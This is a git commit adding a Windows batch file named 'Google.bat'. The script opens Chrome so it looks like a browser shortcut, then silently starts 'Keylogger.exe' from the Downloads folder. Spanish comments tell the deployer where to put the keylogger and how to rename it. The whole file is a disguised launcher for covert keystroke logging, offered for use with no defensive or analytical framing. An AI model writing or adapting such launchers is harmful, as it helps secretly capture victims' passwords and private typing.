c2dc46e7a109a31087987731f8fc6434fd9c3731
M01000 <92542045+UserM01000@users.noreply.github.com>
2021-11-17 22:00:05 -0500

    Add files via upload

---
+++ Google.bat
@@ -0,0 +1,12 @@
+@echo off
+
+start chrome.exe
+
+REM a continuacion tendran que poner el direcotrio en donde
+REM se encuntra el keylogger les pondre ejemplo
+
+cd C:\Users\Usuario\Downloads
+
+REM si le cambiaron el nombre al keylogger entonces 
+REM ponen el nombre que le pusieron al ejecutable
+start Keylogger.exe
